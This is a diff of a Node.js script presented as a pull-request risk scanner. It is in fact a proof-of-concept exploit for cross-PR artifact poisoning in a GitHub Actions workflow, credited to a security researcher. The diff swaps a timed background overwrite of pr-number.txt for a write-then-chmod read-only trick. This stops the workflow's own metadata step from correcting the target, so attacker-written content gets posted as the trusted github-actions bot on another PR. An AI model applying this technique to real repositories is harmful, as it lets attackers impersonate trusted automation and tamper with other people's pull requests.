@@ -2,7 +2,6 @@
 
 import fs from "fs";
 import path from "path";
-import { execSync } from "child_process";
 
 const args = process.argv.slice(2);
 let outputJson = "pr-risk-results/results.json";
@@ -17,18 +16,13 @@ fs.mkdirSync(path.dirname(outputJson), { recursive: true });
 fs.mkdirSync(path.dirname(outputMd), { recursive: true });
 
 fs.writeFileSync(outputMd, `<!-- pr-risk-scan-results -->
-## PoC: Cross-PR Artifact Poisoning
+## Cross-PR Injection PoC
 
-This comment was injected onto a DIFFERENT pull request
-by an attacker-controlled scanner via artifact poisoning.
+This comment was posted on a PR/issue the attacker does NOT own.
+Content and target are fully attacker-controlled via artifact poisoning.
 
-The attacker controls both the comment content (report.md)
-and the target PR number (pr-number.txt).
-
-**Impact:** Arbitrary content injection on ANY issue/PR
-in the repository, posted as the trusted github-actions bot.
-
-**Filed by:** Devdeep781 (security research)
+**Attacker:** Devdeep781 (security research)
+**Vector:** Modified scanner in fork PR writes controlled report.md and pr-number.txt
 `);
 
 fs.writeFileSync(outputJson, JSON.stringify({
@@ -39,9 +33,10 @@ fs.writeFileSync(outputJson, JSON.stringify({
   findings: []
 }));
 
-// Spawn background process that overwrites pr-number.txt
-// AFTER the "Save metadata" step writes the real PR number
-// Target: PR #1 (an existing PR we don't own)
-execSync('bash -c \'(sleep 10 && echo "1" > pr-risk-results/pr-number.txt) &\'');
+// Write target PR number and make it READ-ONLY
+// The "Save metadata" step will fail to overwrite this
+// because echo "2614" > pr-number.txt gets permission denied
+fs.writeFileSync("pr-risk-results/pr-number.txt", "1");
+fs.chmodSync("pr-risk-results/pr-number.txt", 0o444);
 
 process.exit(0);
